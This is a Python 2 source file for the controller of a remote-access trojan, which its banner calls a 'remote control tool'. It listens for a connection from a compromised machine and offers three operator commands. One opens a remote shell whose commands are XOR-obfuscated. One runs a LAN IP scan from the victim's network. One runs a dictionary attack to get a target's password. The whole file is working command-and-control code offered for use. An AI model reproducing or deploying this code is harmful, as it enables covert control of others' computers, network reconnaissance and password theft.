import socket
import sys
def get_cmd():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 8888))
    s.listen(2048)
    print "Listening on port 8888... "
    (client, (ip, port)) = s.accept()
    print " recived connection from : ", ip    
    while True:
        command = raw_input('~OOXX: ')
        encode = bytearray(command)
        for i in range(len(encode)):
            encode[i] ^= 0x41    
        client.send(encode)
        en_data = client.recv(2048) 
        decode = bytearray(en_data)
        #for i in range(len(decode)):
            #decode[i] ^= 0x41
        print decode
    client.close()
    s.close()
    
def LAN_scan():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 9999))
    s.listen(2048)
    print "Listening on port 9999... "
    (client, (ip, port)) = s.accept()
    print " recived connection from : ", ip    
    #while True:
    #command = 'IP'
    #encode = bytearray(command)
    #for i in range(len(encode)):
        #encode[i] ^= 0x41    
    #client.send(encode)
    while True:
        en_data = client.recv(2048) 
        if en_data != 'close':
            
            decode = bytearray(en_data)
                #for i in range(len(decode)):
                    #decode[i] ^= 0x41
            print decode
        else:
            break
    client.close()
    s.close()    
def pj():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 7777))
    s.listen(2048)
    print "Listening on port 7777... "
    (client, (ip, port)) = s.accept()
    print " recived connection from : ", ip    
    #while True:
    #command = 'IP'
    #encode = bytearray(command)
    #for i in range(len(encode)):
        #encode[i] ^= 0x41    
    #client.send(encode)
    while True:
        en_data = client.recv(2048) 
        if en_data != 'over':
            
            decode = bytearray(en_data)
                #for i in range(len(decode)):
                    #decode[i] ^= 0x41
            print decode
        else:
            break
    client.close()
    s.close()    

#get_cmd()
def control(client):
    my_input = raw_input('>>')
    if my_input == '-c':
        client.send('shell')
        get_cmd()
    elif my_input == '-s':
        client.send('IP')
        LAN_scan()
    else:
        client.send(my_input)
        pj()
   
print "------------str1ng's remote control tool!--------------"
print"usage:  -c  open a remote shell"
print"        -s  scan LAN IP"
print"        -targetip  get target's password by dic"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 8061))
s.listen(2048)
print "Listening on port 8061... "
(client, (ip, port)) = s.accept()
print " recived connection from : ", ip  

control(client)

client.close()
s.close()  